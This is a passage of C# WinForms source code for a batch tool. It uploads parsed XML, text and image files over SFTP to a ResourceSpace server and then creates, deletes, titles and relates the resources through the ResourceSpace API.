//                strResult = GetWebRequestResult(GetURL("&function=update_field&resource=" + strResult + "&field="+ nd_meta_Title.Value.ToString() +"&value=" + strTitle));
                strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);
                if (strResult.ToLower() != "true")
                {
                    Global.WriteToFile("Set Sub Title Fail " + strFileName, false);
//                    i_Fail_Count = i_Fail_Count + 1;
                    bFail = true;
                }
            }
            catch (Exception ex)
            {
                Global.WriteToFile("Set Sub Title Fail " + strFileName, false);
            //    i_Fail_Count = i_Fail_Count + 1;
                bFail = true;
            }
        }

        private void SetTitle(string strResult, string strFileName, string strTitle, ref bool bFail, Encoding enc)
        {
            try
            {
                int i_ref_id = Convert.ToInt32(strResult);

                string strSign = "";
                string struel = GetURL_Post("&function=update_field&resource=" + strResult + "&field=" + nd_meta_Title.Value.ToString() + "&value=" + strTitle, ref strSign, enc);
                strResult = GetWebRequestResult_Post(txt_RS_Url.Text.Trim() + "/api/", struel, strSign, txt_RS_Login.Text.Trim(), enc);

                //                strResult = GetWebRequestResult(GetURL("&function=update_field&resource=" + strResult + "&field="+ nd_meta_Title.Value.ToString() +"&value=" + strTitle));
                strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);
                if (strResult.ToLower() != "true")
                {
                    Global.WriteToFile("Set Title Fail " + strFileName, false);
                    //                    i_Fail_Count = i_Fail_Count + 1;
                    bFail = true;
                }
            }
            catch (Exception ex)
            {
                Global.WriteToFile("Set Title Fail " + strFileName, false);
                //    i_Fail_Count = i_Fail_Count + 1;
                bFail = true;
            }
        }



        private void SetContent(string strResult, string strFileName, string strContent, ref bool bFail, Encoding enc)
        {
            try
            {
                int i_ref_id = Convert.ToInt32(strResult);
//                strResult = GetWebRequestResult(GetURL("&function=update_field&resource=" + strResult + "&field=" + nd_meta_Content.Value.ToString() + "&value=" + strContent));
//                strResult = GetWebRequestResult(GetURL_test("&function=update_field&resource=" + strResult + "&field=" + nd_meta_Content.Value.ToString() + "&value=" + strContent));
//                strResult = GetWebRequestResult(GetURL_test(""));

                string strSign = "";
                string struel = GetURL_Post("&function=update_field&resource=" + strResult + "&field=" + nd_meta_Content.Value.ToString() + "&value=" + strContent, ref strSign, enc);
//                string struel = GetURL_Post("&function=get_user_collections", ref strSign);
//                string struel = GetURL_Post("", ref strSign);

                strResult = GetWebRequestResult_Post(txt_RS_Url.Text.Trim() + "/api/", struel, strSign, txt_RS_Login.Text.Trim(), enc);
                strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);
                if (strResult.ToLower() != "true")
                {
                    Global.WriteToFile("Set Content Fail " + strFileName, false);
//                    i_Fail_Count = i_Fail_Count + 1;
                    bFail = true;
                }
            }
            catch (Exception ex)
            {
                Global.WriteToFile("Set Content Fail " + strFileName, false);
//                i_Fail_Count = i_Fail_Count + 1;
                bFail = true;
            }
        }

        private string Delete_existing_Resources(string strFileName, string strPubDate)
        {
            string strFil = strFileName.Substring(strFileName.LastIndexOf("\\")+1);
            string strDate = strPubDate.Replace("-","|");

            string strResult = GetWebRequestResult(GetURL("&function=do_search&search=publicationdate:" + strDate + " originalfilename:" + strFil + "&restypes=1,2,3,4,10"));

            strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
            strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);

            strResult = strResult.Replace("\"ref\"", "\"Ref\"");
            strResult = strResult.Replace("\r", "");
            strResult = strResult.Replace("\n", "");
            try
            {

                m_searchResult = new List<SearchResult>(JsonHelper.JsonDeserialize<SearchResult[]>(strResult));

                for (int i = 0; i < m_searchResult.Count; i++)
                {
                    strResult = GetWebRequestResult(GetURL("&function=delete_resource&resource=" + m_searchResult[i].Ref));
                    if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                    {
                        return strResult;
                    }
                    else
                    {
                        // call another time for permanent delete 
                        strResult = GetWebRequestResult(GetURL("&function=delete_resource&resource=" + m_searchResult[i].Ref));
                        if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                        {
                            return strResult;
                        }

                    }
                }
            }
            catch (Exception ex)
            {
                return "error";
            }
            return strResult;
        }



        private void Delete_Resources()
        {

            string strDelDate = dateTimePicker1.Value.Date.Year.ToString() + "|" +
                dateTimePicker1.Value.Date.Month.ToString().PadLeft(2, '0') + "|" +
                dateTimePicker1.Value.Date.Day.ToString().PadLeft(2, '0');

            string strResult = GetWebRequestResult(GetURL("&function=do_search&search=publicationdate:" + strDelDate + "&restypes=1,2,3,4,10"));

            strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
            strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);

            strResult = strResult.Replace("\"ref\"", "\"Ref\"");
            strResult = strResult.Replace("\r", "");
            strResult = strResult.Replace("\n", "");
            try
            {

                m_searchResult = new List<SearchResult>(JsonHelper.JsonDeserialize<SearchResult[]>(strResult));

                for (int i = 0; i < m_searchResult.Count; i++)
                {
                    strResult = GetWebRequestResult(GetURL("&function=delete_resource&resource=" + m_searchResult[i].Ref));
                    if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                    {
                        continue;
                    }
                    else
                    {
                        strResult = GetWebRequestResult(GetURL("&function=delete_resource&resource=" + m_searchResult[i].Ref));
                        if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception ex)
            {

            }


            strResult = GetWebRequestResult(GetURL("&function=do_search&search=publicationdate:" + strDelDate + "&archive=3&restypes=1,2,3,4,10"));

            strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
            strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);

            strResult = strResult.Replace("\"ref\"", "\"Ref\"");
            strResult = strResult.Replace("\r", "");
            strResult = strResult.Replace("\n", "");
            try
            {

                m_searchResult = new List<SearchResult>(JsonHelper.JsonDeserialize<SearchResult[]>(strResult));

                for (int i = 0; i < m_searchResult.Count; i++)
                {
                    strResult = GetWebRequestResult(GetURL("&function=delete_resource&resource=" + m_searchResult[i].Ref));
                    if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                    {
                        continue;
                    }
                }
            }
            catch (Exception ex)
            {

            }
        
        }

        private string Create_Resource(string strFileName, string strFileName_Lower, string strPubDate, string strCreateDate, 
            string strTitle, string strSubTitle, string strContent, string strDept, string strPage, string strDefaultResourceTypeID, ref bool b_text)
        {
            //**********************************************************
            // create resource
            //**********************************************************
            try
            {
                //****************************
                // 2- Document
                //****************************
                b_text = false;

                string strResType = strDefaultResourceTypeID;
                if (strResType.Trim() == "")
                {
//                    strResType = "0";
                    strResType = GetResourceTypeID(strFileName_Lower.Substring(strFileName_Lower.LastIndexOf(".") + 1));
                }
                if (strFileName_Lower.EndsWith(".txt"))
                {
                     b_text = true;
                }

                
                //                                string strMeta = "&metadata={\"92\":\"" + strPubDate + "\",\"" + txt_meta_Title.Text.Trim() + "\":\"" + strTitle + "\"}";
                string strMeta = "&metadata={\"" + nd_meta_Pub_Date.Text.Trim() + "\":\"" + strPubDate + "\",\"" + nd_meta_CreateDate.Text.Trim() + "\":\"" +
                    strCreateDate + "\",\"" + nd_meta_Dept.Text.Trim() + "\":\"" + strDept + "\",\"" + nd_meta_Page.Text.Trim() + "\":\"" + strPage + "\"}";
//                    "\"" + nd_meta_Title.Text.Trim() + "\":\"" + strTitle +  " " + strSubTitle + "\",\"" + nd_meta_SubTitle.Text.Trim() + "\":\"" + strSubTitle + "\"}";
//                      "\"" + nd_meta_Title.Text.Trim() + "\":\"" + strTitle + "\",\"25\":\"" + strContent + "\"}";
//                      "\"" + nd_meta_Title.Text.Trim() + "\":\"" + strTitle + "\"}";


                string strResult = GetWebRequestResult(GetURL("&function=create_resource&resource_type=" + strResType + "&archive=0" + strMeta + "&url=" + strFileName));

                strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);

                strResult = strResult.Replace("\"ref\"", "\"Ref\"");

                try
                {
                    Convert.ToInt32(strResult);
                }
                catch (Exception ex)
                {
                    return "error";
                }
                return strResult;

            }
            catch (Exception ex)
            {
                return "error";
            }
        }

        delegate void SetProgressBartCallback(int i_value, bool b_Max);

        private void SetProgressBar(int i_value, bool b_Max)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.pBar.InvokeRequired)
            {
                SetProgressBartCallback d = new SetProgressBartCallback(SetProgressBar);
                this.Invoke(d, new object[] { i_value, b_Max });
            }
            else
            {
                if (b_Max)
                    this.pBar.Maximum = i_value;
                else
                    this.pBar.Value = i_value;
            }
        }

        delegate void SetLabelCallback(string strText);

        private void SetLabel(string strText)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.lbl_File.InvokeRequired)
            {
                SetLabelCallback d = new SetLabelCallback(SetLabel);
                this.Invoke(d, new object[] {strText});
            }
            else
            {
                this.lbl_File.Text = strText;
            }
        }


        delegate void SetLabelRelatedCallback(string strText);

        private void SetLabelRelated(string strText)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.lbl_Relate_Error.InvokeRequired)
            {
                SetLabelRelatedCallback d = new SetLabelRelatedCallback(SetLabelRelated);
                this.Invoke(d, new object[] { strText });
            }
            else
            {
                this.lbl_Relate_Error.Text = strText;
            }
        }


        delegate void SetUploadButtonCallBack(bool bEnable);

        private void SetUploadButton(bool bEnable)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.btnUpload.InvokeRequired)
            {
                SetUploadButtonCallBack d = new SetUploadButtonCallBack(SetUploadButton);
                this.Invoke(d, new object[] { bEnable });
            }
            else
            {
                this.btnUpload.Enabled = bEnable;
            }
        }

        delegate void SetStopButtonCallBack(bool bEnable);

        private void SetStopButton(bool bEnable)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.btn_Stop.InvokeRequired)
            {
                SetStopButtonCallBack d = new SetStopButtonCallBack(SetStopButton);
                this.Invoke(d, new object[] { bEnable });
            }
            else
            {
                this.btn_Stop.Enabled = bEnable;
            }
        }

        public static Encoding GetEncoding(string filename)
        {
            // Read the BOM
            var bom = new byte[4];
            using (var file = new FileStream(filename, FileMode.Open, FileAccess.Read))
            {
                file.Read(bom, 0, 4);
            }

           //                                       // Analyze the BOM
            if (bom[0] == 0x2b && bom[1] == 0x2f && bom[2] == 0x76) return Encoding.UTF7;
            if (bom[0] == 0xef && bom[1] == 0xbb && bom[2] == 0xbf) return Encoding.UTF8;
//            Encoding utf8WithoutBom = new ;

            if (bom[0] == 0xef && bom[1] == 0xbb && bom[2] == 0xbf) return new UTF8Encoding(encoderShouldEmitUTF8Identifier: false);
            if (bom[0] == 0xff && bom[1] == 0xfe && bom[2] == 0 && bom[3] == 0) return Encoding.UTF32; //UTF-32LE
            if (bom[0] == 0xff && bom[1] == 0xfe) return Encoding.Unicode; //UTF-16LE
            if (bom[0] == 0xfe && bom[1] == 0xff) return Encoding.BigEndianUnicode; //UTF-16BE
            if (bom[0] == 0 && bom[1] == 0 && bom[2] == 0xfe && bom[3] == 0xff) return new UTF32Encoding(true, true);  //UTF-32BE

            // We actually have no idea what the encoding is if we reach this point, so
            // you may wish to return null instead of defaulting to ASCII
            return Encoding.Default;
        }


        private void OnStart(object args)
        {
            Array argArray = new object[3];
            argArray = (Array)args;

            string strTextCollectionID = (string)argArray.GetValue(0);
            string strPicCollectionID = (string)argArray.GetValue(1);
            string strDefaultResourceTypeID = (string)argArray.GetValue(2);
            argArray = null;

            string[] files =
                Directory.GetFiles(txt_RS_SourceDir.Text, "*.*", SearchOption.AllDirectories);

            int i_Succsess_Count = 0;
            int i_Total_Count = 0;
            int i_Total_Image_Count = 0;
            int i_Total_Text_Count = 0;
            int i_Fail_Image_Count = 0;
            int i_Fail_Text_Count = 0;
            bool bFail_Text = false;
            bool bFail_Image = false;
            bool bFail_Related = false;

//            if (files.GetLength() <= 0)
  //              return;

            SftpClient sftpclient = new SftpClient(txt_LinuxIP.Text.Trim(), Convert.ToInt32(txt_LinuxPort.Text.Trim()), txt_LinuxLogin.Text.Trim(), txt_LinuxPass.Text.Trim());
            sftpclient.Connect();


            //            string strPath = "/opt/bitnami/resourcespace/uploadtemp/";

            string strPath = txt_Root.Text;
            if (!strPath.EndsWith("/"))
                strPath = strPath + "/";
            bool fileExist = sftpclient.Exists(strPath);
            if (!fileExist)
            {
                sftpclient.CreateDirectory(strPath);
                SftpFileAttributes attr1 = sftpclient.GetAttributes(strPath);
                attr1.SetPermissions(777);
                sftpclient.SetAttributes(strPath, attr1);
            }

            fileExist = sftpclient.Exists(strPath);
            if (!fileExist)
            {
                MessageBox.Show("FRS Working Directory does not exist");
                return;
            }
            
            try
            {
                //**********************************************************
                // Loop files in direcotry
                //**********************************************************
                // init pub date and create date
                string strPubDate = "";
                string strCreateDate = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                List<PageInfo> PageInfoArr = new List<PageInfo>();
//                List<string> RelateArr = new List<string>();
                string strAllRelated = "";
                string strPathName_Prev = "";
                SetProgressBar(files.Length, true);

                for (int i = 0; i < files.Length; i++)
                {
                    SetProgressBar(i + 1, false);
//                    if (uploadThread.ThreadState == null)
  //                  {
    //                    MessageBox.Show("Upload stopped");
      //                  return;
        //            }
//                    if (uploadThread.ThreadState ==System.Threading.ThreadState.Aborted || uploadThread.ThreadState == System.Threading.ThreadState.AbortRequested)
                    if (m_stopped)
                    {
//                        MessageBox.Show("Upload stopped");
                        m_stopped = true;
                        SetProgressBar(0, false);
                        return;
                    }

                    //                    MessageBox.Show(files[i]);

                    //**********************************************************
                    // exclude directory
                    //**********************************************************
                    FileAttributes attr = File.GetAttributes(files[i]);
                    if (attr.HasFlag(FileAttributes.Directory))
                        continue;

                    string strFileName = files[i].Substring(files[i].LastIndexOf("\\") + 1);
                    strFileName = strPath + strFileName;

                    string strPathName = files[i].Substring(0,files[i].LastIndexOf("\\"));

                    if (strPathName != strPathName_Prev)
                    {
                        if (cb_RelateAll.Checked)
                        {
                            if (strAllRelated.IndexOf(",") > 0)
                            {
//                                AddPageRelation(ref strAllRelated, ref bFail);
                                AddPageRelation(ref strAllRelated, ref bFail_Related);
                            }
                        }
                        strPathName_Prev = strPathName;
                    }                    
                    
                    string strPathCode = ""; 
                    if (strPathName.IndexOf("\\") >= 0)
                    {
                        strPathCode = strPathName.Substring(strPathName.LastIndexOf("\\") + 1);
                    }

                    SetLabelRelated("");
 

                    string strFileName_Lower = strFileName.ToLower();

                    string strTitle = "";
                    string strSubTitle = "";
                    string strContent = "";

                    List<PicInfo> arrPicList = new List<PicInfo>();
                    bool b_Process = false;
                    if (strFileName_Lower.EndsWith(".xml") == false)
                        continue;
                    else
                    {
//                        SetLabel("Processing: " + files[i] + "   Success: " + (i_Total_Count - i_Fail_Count).ToString() + "  Error Found: " + i_Fail_Count.ToString());
                        SetLabel("Processing: " + files[i] + "   Success: " + (i_Total_Text_Count - i_Fail_Text_Count).ToString() + " Text " + (i_Total_Image_Count - i_Fail_Image_Count).ToString() +  " Images " + "   Error: " +  i_Fail_Text_Count.ToString() + " Text " +  i_Fail_Image_Count.ToString() + " Images");
                        parseXML(files[i], ref strTitle, ref strSubTitle, ref arrPicList, ref b_Process, ref strPubDate, ref strContent, ref PageInfoArr, ref strAllRelated);
                    }
                    if (!b_Process) continue;
                    Global.WriteToFile("Import File: " + files[i], false);
                    bFail_Text = false;
                    bFail_Image = false;
                    i_Total_Count = i_Total_Count + 1;
                    string strTxtFileName = files[i].Replace(".xml", ".txt");
                    string strRelated = "";

                    string strDept = "";
                    string strPage = "";
                    for (int k = 0; k <= PageInfoArr.Count - 1; k++)
                    {
                        if (PageInfoArr[k].Code.ToLower() == strPathCode.ToLower())
                        {
                            strDept = PageInfoArr[k].Category + "/" + PageInfoArr[k].Desc;
                            strPage = PageInfoArr[k].Number;
                        }
                    }

                    //if (File.Exists(strTxtFileName))
                    if (strTxtFileName.Trim()!="")
                    {
                        i_Total_Text_Count = i_Total_Text_Count + 1;
                        //**********************************************************
                        // Copy File to Linux (resourcespace) ) server
                        //**********************************************************
                        strFileName = strTxtFileName.Substring(strTxtFileName.LastIndexOf("\\") + 1);
                        strFileName = strPath + strFileName;
                        strFileName_Lower = strFileName.ToLower();
  //                      File.WriteAllText(strTxtFileName, fileContent, Encoding.UTF8);
                        //File.WriteAllText(strTxtFileName, strContent, Encoding.UTF8);

                        if (File.Exists(strTxtFileName))
                        {
                            Encoding enc =  GetEncoding(strTxtFileName);
                            string fileContent = File.ReadAllText(strTxtFileName, Encoding.Default);
                            
                            if (enc.HeaderName.ToLower().StartsWith("big5") || enc.BodyName.ToLower().StartsWith("big5") )
                                fileContent = fileContent.Replace("／", "$^^-$^^-$^^-");
                            
                            var stream = new MemoryStream();
                            //                        var writer = new StreamWriter(stream, Encoding.UTF8);
//                            Encoding utf8WithoutBom = new UTF8Encoding(encoderShouldEmitUTF8Identifier: false);
//                            var writer = new StreamWriter(stream, utf8WithoutBom);
                            var writer = new StreamWriter(stream, enc);
                            //                        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
                            //int nCP = 951;
                            //                        Encoding big5 = Encoding.GetEncoding(nCP); 
                            //                      byte[] b = Encoding.Default.GetBytes(strContent);//將字串轉為byte[]
                            //                        MessageBox.Show(Encoding.Default.GetString(b));//驗證轉碼後的字串,仍再正確的顯示.
                            //byte[] c = Encoding.Convert(Encoding.Default, Encoding.UTF8, b);//進行轉碼,參數1,來源編碼,參數二,目標編碼,參數三,欲編碼變數
                            //                    byte[] c = Encoding.Convert(Encoding.Default, utf8WithoutBom, b);//進行轉碼,參數1,來源編碼,參數二,目標編碼,參數三,欲編碼變數
                            //                      MessageBox.Show(Encoding.UTF8.GetString(c));//顯示轉為UTF8後,仍能正確的顯示字串

                            //                  writer.Write(utf8WithoutBom.GetString(c));
                            //                        writer.Write(strContent);
                            writer.Write(fileContent);
                            writer.Flush();
                            stream.Position = 0;
                            //                  return stream;

                            //                        using (var fileStream = File.OpenRead(strTxtFileName))
                            //                      {
                            //sftpclient.UploadFile(fileStream, strFileName);
                            sftpclient.UploadFile(stream, strFileName);

                            SftpFileAttributes attr1 =  sftpclient.GetAttributes(strFileName);
                            attr1.SetPermissions(777);
                            sftpclient.SetAttributes(strFileName, attr1);

                            writer = null;
                            stream = null;

                            //                    }

                            //**********************************************************
                            // create resource
                            //**********************************************************
                            bool b_text = true;

                            string strResult = Delete_existing_Resources(strTxtFileName, strPubDate);
                            if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                            {
                                Global.WriteToFile("Delete Existing Resource Fail " + strTxtFileName, false);
                                //                            i_Fail_Count = i_Fail_Count + 1;
                                bFail_Text = true;
                                i_Fail_Text_Count = i_Fail_Text_Count + 1;
                                i_Fail_Image_Count = i_Fail_Image_Count + arrPicList.Count;
                                i_Total_Image_Count = i_Total_Image_Count + arrPicList.Count;
                                continue;
                            }

                            strResult = Create_Resource(strFileName, strFileName_Lower, strPubDate, strCreateDate, strTitle, strSubTitle, strContent, strDept, strPage, strDefaultResourceTypeID, ref b_text);
                            if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                            {
                                Global.WriteToFile("Import Fail " + strTxtFileName, false);
                                //                            i_Fail_Count = i_Fail_Count + 1;
                                bFail_Text = true;
                                i_Fail_Text_Count = i_Fail_Text_Count + 1;
                                i_Fail_Image_Count = i_Fail_Image_Count + arrPicList.Count;
                                i_Total_Image_Count = i_Total_Image_Count + arrPicList.Count;
                                continue;
                            }
                            strRelated = strResult;
                            if (strAllRelated.Trim() != "")
                                strAllRelated = strAllRelated + "," + strResult;
                            else
                                strAllRelated = strResult;
                            //                        MessageBox.Show("Ref ID: " + strResult);

                            //**********************************************************
                            // Add New resource to selected collection
                            //**********************************************************

                            //                        string strCollection = GetCollectionID(b_text);
                            if (b_text)
                            {
                                if (strTextCollectionID != "")
                                {
                                    Add_To_Collection(strTextCollectionID, strResult, strTxtFileName, ref bFail_Text);
                                }
                            }
                            else
                            {
                                if (strPicCollectionID != "")
                                {
                                    Add_To_Collection(strPicCollectionID, strResult, strTxtFileName, ref bFail_Text);
                                }
                            }

                            if (nd_meta_Title.Text.Trim() != "")
                            {
                                if (strTitle.Trim() != "")
                                {
                                    //                            if (strSubTitle.Trim() != "")
                                    //                                SetTitle(strResult, strTxtFileName, strTitle + " " + strSubTitle, ref bFail);
                                    SetTitle(strResult, strTxtFileName, strTitle, ref bFail_Text, GetEncoding(files[i]));
                                    //                            else
                                    //                                SetTitle(strResult, strTxtFileName, strTitle, ref bFail);
                                }
                            }
                            /*                        if (nd_meta_SubTitle.Text.Trim() != "")
                                                    {
                                                        if (strSubTitle.Trim() != "")
                                                        {
                                                            SetSubTitle(strResult, strTxtFileName, strSubTitle, ref bFail);
                                                        }
                                                    }
                            */
                           sftpclient.DeleteFile(strFileName);
                        }
                        else
                        {
                            Global.WriteToFile("Text not exists: " + strTxtFileName, false);
                            i_Fail_Text_Count = i_Fail_Text_Count + 1;
                            continue;

                        }

                    }

                    for (int k = 0; k < arrPicList.Count; k++)
                    {

                        string strPicFileName = files[i].Substring(0, files[i].LastIndexOf("\\") + 1) + arrPicList[k].strPicName;

                        if (arrPicList[k].strSubTitle.Trim() != "")
                            strTitle = arrPicList[k].strSubTitle;                       
                            //strSubTitle = arrPicList[k].strSubTitle;                       

                        i_Total_Image_Count = i_Total_Image_Count + 1;
                        if (File.Exists(strPicFileName))
                        {

                            
                            //**********************************************************
                            // Copy File to Linux (resourcespace) ) server
                            //**********************************************************
                            strFileName = strPicFileName.Substring(strPicFileName.LastIndexOf("\\") + 1);
                            strFileName = strPath + arrPicList[k].strPicName;
                            strFileName_Lower = strFileName.ToLower();
                            using (var fileStream = File.OpenRead(strPicFileName))
                            {
                                sftpclient.UploadFile(fileStream, strFileName);
                            }

                            bool b_text = true;

                            string strResult = Delete_existing_Resources(strPicFileName, strPubDate);
                            if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                            {
                                Global.WriteToFile("Delete Existing Resource Fail " + strTxtFileName, false);
                                i_Fail_Image_Count = i_Fail_Image_Count + 1;
                                continue;
                            }

                            strResult = Create_Resource(strFileName, strFileName_Lower, strPubDate, strCreateDate, strTitle, strSubTitle, strContent, strDept, strPage, strDefaultResourceTypeID, ref b_text);

                            if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                            {
                                Global.WriteToFile("Import Fail " + strPicFileName, false);
                                i_Fail_Image_Count = i_Fail_Image_Count + 1;
                                continue;
                            }
                            strRelated = strRelated + "," + strResult;
                            if (strAllRelated.Trim() != "")
                                strAllRelated = strAllRelated + "," + strResult;
                            else
                                strAllRelated = strResult;

                            //                        MessageBox.Show("Ref ID: " + strResult);

                            //**********************************************************
                            // Add New resource to selected collection
                            //**********************************************************
//                            string strCollection = GetCollectionID(b_text);
                            if (b_text)
                            {
                                if (strTextCollectionID != "")
                                {
                                    Add_To_Collection(strTextCollectionID, strResult, strTxtFileName, ref bFail_Image);
                                }
                            }
                            else
                            {
                                if (strPicCollectionID != "")
                                {
                                    Add_To_Collection(strPicCollectionID, strResult, strTxtFileName, ref bFail_Image);
                                }
                            }
                            if (nd_meta_Title.Text.Trim() != "")
                            {
                                if (strTitle.Trim() != "")
                                    SetTitle(strResult, strPicFileName, strTitle, ref bFail_Image, GetEncoding(files[i]));
                                //                            if (strContent.Trim() != "")
                                //                              SetContent(strResult, strPicFileName, strContent, ref i_Fail_Count);
                            }
                            if (nd_meta_SubTitle.Text.Trim() != "")
                            {
                                if (strSubTitle.Trim() != "")
                                {
                                    SetSubTitle(strResult, strPicFileName, strSubTitle, ref bFail_Image, GetEncoding(files[i]));
                                }
                            }

                            sftpclient.DeleteFile(strFileName);
                        }
                        else
                        {
                            Global.WriteToFile("Image not exists: " + strPicFileName, false);
                            i_Fail_Image_Count = i_Fail_Image_Count + 1;
                            continue;

                        }
                    }

                    //********************************************************************
                    // relate tezt and all photos
                    //********************************************************************
                    if (!cb_RelateAll.Checked)
                    {
                        if (strRelated.IndexOf(",") > 0)
                        {
                            try
                            {
                                string strResult = GetWebRequestResult(GetURL("&function=relate_all_resources&related=" + strRelated));
                                strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                                strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);
                                if (strResult.ToLower() != "true")
                                {
                                    Global.WriteToFile("Related Files Fail " + strRelated, false);
//                                    i_Fail_Count = i_Fail_Count + 1;
                                    bFail_Related = true;
                                    continue;
                                }
                            }
                            catch (Exception ex)
                            {
                                Global.WriteToFile("Related Files Fail " + strRelated, false);
//                                i_Fail_Count = i_Fail_Count + 1;
                                bFail_Related = true;
                                continue;
                            }
                        }
                    }
                    if (bFail_Image)
                        i_Fail_Image_Count = i_Fail_Image_Count + 1;
                    if (bFail_Text)
                        i_Fail_Text_Count = i_Fail_Text_Count + 1;
                    i_Succsess_Count = i_Succsess_Count + 1;
                    Global.WriteToFile("Import File Finish " + files[i], false);
                }

                //********************************************************************
                // final relate 
                //********************************************************************
                if (cb_RelateAll.Checked)
                {
                    if (strAllRelated.IndexOf(",") > 0)
                    {
                        AddPageRelation(ref strAllRelated, ref bFail_Related);
//                        AddPageRelation(ref strAllRelated);
                    }
                }
                //********************************************************************

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                m_stopped = true;
                return;
            }
            sftpclient.Disconnect();
            sftpclient = null;
            m_stopped = true;
//            btnUpload.Enabled = true;
  //          btn_Stop.Enabled = false;
            SetUploadButton(true);
            SetStopButton(false);

            MessageBox.Show("Upload Finish");
            string strFinal = "Process Finished:   Success: " + (i_Total_Text_Count - i_Fail_Text_Count).ToString() + " Text " + (i_Total_Image_Count - i_Fail_Image_Count).ToString() + " Images " + "   Error: " + i_Fail_Text_Count.ToString() + " Text " + i_Fail_Image_Count.ToString() + " Images";

            SetLabel(strFinal);
            if (bFail_Related)
                SetLabelRelated("Related Files Error Found, please check log file ");
            Global.WriteToFile(strFinal, false);
            Global.WriteToFile("==========================================================================", false);
 
        }

        private void btnUpload_Click(object sender, EventArgs e)
        {
            if (!m_stopped)
            {
                MessageBox.Show("Upload process is already running!");
                return;
            }

            if (Apply_DB_Setting(false, true) == false) return;
            if (Test_Linux(false) == false) return;
//            if (LoadUserCollectionResourceTypes(false, true) == false) return; 

            if (txt_RS_Url.Text.Trim() == "")
            {
                MessageBox.Show("FRS URL is empty!");
                return;
            }

            if (txt_RS_Login.Text.Trim() == "")
            {
                MessageBox.Show("FRS User Name is empty!");
                return;
            }

            if (txt_RS_Key.Text.Trim() == "")
            {
                MessageBox.Show("Resourcespace API Key is empty!");
                return;
            }

            if (txt_RS_SourceDir.Text.Trim()=="")
            {
                MessageBox.Show("Source Data Directory is empty!");
                return;
            }

            if (!Directory.Exists(txt_RS_SourceDir.Text))
            {
                MessageBox.Show("Source Data Directory is not existed!");
                return;
            }

            if (cb_Text_Type.SelectedIndex < 0)
            {
                MessageBox.Show("Text Default Collection is empty!");
                return;
            }

            if (cb_Pic_Type.SelectedIndex < 0)
            {
                MessageBox.Show("Pic Default Collection is empty!");
                return;
            }


            if (nd_meta_Title.Text.Trim() == "")
            {
                MessageBox.Show("Title Metadata ID is empty!");
                return;
            }
/*
            if (nd_meta_Content.Text.Trim() == "")
            {
                MessageBox.Show("Content Metadata ID is empty!");
                return;
            }
*/
            if (nd_meta_Page.Text.Trim() == "")
            {
                MessageBox.Show("Page Metadata ID is empty!");
                return;
            }

            if (nd_meta_Dept.Text.Trim() == "")
            {
                MessageBox.Show("Department Metadata ID is empty!");
                return;
            }

            if (nd_meta_Pub_Date.Text.Trim() == "")
            {
                MessageBox.Show("Pub Date Metadata ID is empty!");
                return;
            }

            if (nd_meta_CreateDate.Text.Trim() == "")
            {
                MessageBox.Show("Create Date Metadata ID is empty!");
                return;
            }

            if (m_resourcetypes.Count <=0 || m_collections.Count <= 0)
            {
                MessageBox.Show("No User colections or resource type is defined in ResourceSpace!");
                return;
            }


           string strTextCollection = GetCollectionID(true);
           string strPicCollection = GetCollectionID(false);
           string strResourceType = GetDefaultResourceTypeID();


            uploadThread = null;
            uploadThread = new Thread(new ParameterizedThreadStart(OnStart));
            uploadThread.SetApartmentState(ApartmentState.STA);
            uploadThread.IsBackground = true;

            object args = new object[3] { strTextCollection, strPicCollection, strResourceType };
            m_stopped = false;

            Global.WriteToFile("==========================================================================", false);
            Global.WriteToFile("User Start Upload", false);

            uploadThread.Start(args);
            btnUpload.Enabled = false;
            btn_Stop.Enabled = true;



/*            vzsdvsdasdfThread = null;
            vzsdvsdasdfThread = new Thread(new ThreadStart(BIifisdjooo));
            vzsdvsdasdfThread.SetApartmentState(ApartmentState.STA);
